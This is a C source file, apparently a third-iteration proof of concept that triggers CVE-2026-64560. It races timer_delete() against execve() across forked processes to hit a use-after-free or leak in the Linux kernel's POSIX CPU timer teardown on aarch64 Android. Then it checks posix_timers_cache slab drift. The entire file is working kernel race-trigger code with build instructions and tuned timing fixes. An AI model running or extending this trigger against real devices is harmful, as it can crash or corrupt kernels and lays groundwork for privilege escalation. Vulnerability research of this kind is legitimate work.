/*
 * cve64560_probe3.c — timing-corrected trigger for CVE-2026-64560
 *
 * Fixes from v2:
 *   1. NO sched_yield() before the delete storm — we want deletes in flight
 *      while the worker is still inside execve(), not after it finished.
 *   2. The deleter thread starts hammering timer_delete() BEFORE the worker
 *      is released, so a delete is already in posix_cpu_timer_del() when
 *      de_thread()/release_task() clears old_leader->sighand.
 *   3. Post-run slab check prints posix_timers_cache drift so the caller can
 *      see whether timers were leaked (dangling nodes) or cleanly freed.
 *
 * Zero kernel offsets. Writes no partition.
 *
 * Build:
 *   zig cc -target aarch64-linux-musl -static -O2 -pthread \
 *          -o cve64560_probe3 cve64560_probe3.c
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_timer_create
#define SYS_timer_create 107
#endif
#ifndef SYS_timer_settime
#define SYS_timer_settime 110
#endif
#ifndef SYS_timer_delete
#define SYS_timer_delete 111
#endif

#define CLK_PROC_CPU 2
#define MAX_TIMERS   512

static volatile int g_release;          /* set right before worker execs */
static volatile unsigned g_del_started;

static void *exec_worker(void *arg)
{
    while (!g_release) sched_yield();
    char *const argv[] = { (char *)"/system/bin/true", NULL };
    char *const envp[] = { NULL };
    execve(argv[0], argv, envp);
    _exit(7);
}

struct del_arg {
    timer_t *tids;
    int n;
};

static void *delete_storm(void *arg)
{
    struct del_arg *a = arg;
    __sync_fetch_and_add(&g_del_started, 1);
    for (int i = 0; i < a->n; i++)
        syscall(SYS_timer_delete, a->tids[i]);
    return NULL;
}

static void victim(int ntimers, int nthreads)
{
    struct sigevent ev;
    struct itimerspec its;
    timer_t tids[MAX_TIMERS];
    pthread_t delths[8];
    struct del_arg da[8];
    pthread_t wth;
    int made = 0;

    memset(&ev, 0, sizeof ev);
    ev.sigev_notify = SIGEV_SIGNAL;
    ev.sigev_signo = SIGUSR1;

    memset(&its, 0, sizeof its);
    its.it_value.tv_sec = 3600;

    for (int i = 0; i < ntimers; i++) {
        if (syscall(SYS_timer_create, CLK_PROC_CPU, &ev, &tids[i]) != 0)
            break;
        syscall(SYS_timer_settime, tids[i], 0, &its, NULL);
        made++;
    }
    if (made < 2) _exit(3);

    if (nthreads > 8) nthreads = 8;
    if (nthreads < 1) nthreads = 1;

    /* Create the worker first; it blocks on g_release. */
    g_release = 0;
    if (pthread_create(&wth, NULL, exec_worker, NULL) != 0) _exit(4);

    /* Splice the timer list across N deleter threads and let them start
     * hammering. They are already inside posix_cpu_timer_del() loops when
     * we release the worker below. */
    int per = made / nthreads;
    g_del_started = 0;
    for (int t = 0; t < nthreads; t++) {
        da[t].tids = &tids[t * per];
        da[t].n = (t == nthreads - 1) ? (made - t * per) : per;
        pthread_create(&delths[t], NULL, delete_storm, &da[t]);
    }

    /* Let the delete storms spin up, then release execve into them. */
    for (int spin = 0; spin < 2000 && g_del_started < (unsigned)nthreads; spin++)
        sched_yield();

    g_release = 1;

    /* From here the process may be replaced by execve at any moment. */
    for (int spin = 0; spin < 100000; spin++)
        usleep(20);

    _exit(0);
}

static void slab_line(char *buf, size_t n)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    buf[0] = 0;
    if (!f) return;
    char line[256];
    while (fgets(line, sizeof line, f)) {
        if (!strncmp(line, "posix_timers_cache", 18)) {
            snprintf(buf, n, "%s", line);
            break;
        }
    }
    fclose(f);
}

int main(int argc, char **argv)
{
    int attempts = (argc > 1) ? atoi(argv[1]) : 100;
    int ntimers  = (argc > 2) ? atoi(argv[2]) : 400;
    int par      = (argc > 3) ? atoi(argv[3]) : 8;
    int dthreads = (argc > 4) ? atoi(argv[4]) : 4;

    char before[256], after[256];
    slab_line(before, sizeof before);

    if (ntimers > MAX_TIMERS) ntimers = MAX_TIMERS;
    if (par > 32) par = 32;

    fprintf(stderr, "[p3] attempts=%d timers=%d par=%d dthreads=%d\n",
            attempts, ntimers, par, dthreads);

    for (int i = 0; i < attempts; i++) {
        pid_t pids[32];
        for (int j = 0; j < par; j++) {
            pid_t p = fork();
            if (p == 0)
                victim(ntimers, dthreads);
            pids[j] = p;
        }
        for (int j = 0; j < par; j++)
            if (pids[j] > 0) waitpid(pids[j], NULL, 0);
        if ((i % 20) == 0)
            fprintf(stderr, "[p3] attempt %d/%d\n", i, attempts);
    }

    /* Let the kernel settle, then report leak drift. */
    usleep(300000);
    slab_line(after, sizeof after);
    fprintf(stderr, "[p3] slab before: %s", before);
    fprintf(stderr, "[p3] slab after : %s", after);
    fprintf(stderr, "[p3] done\n");
    return 0;
}
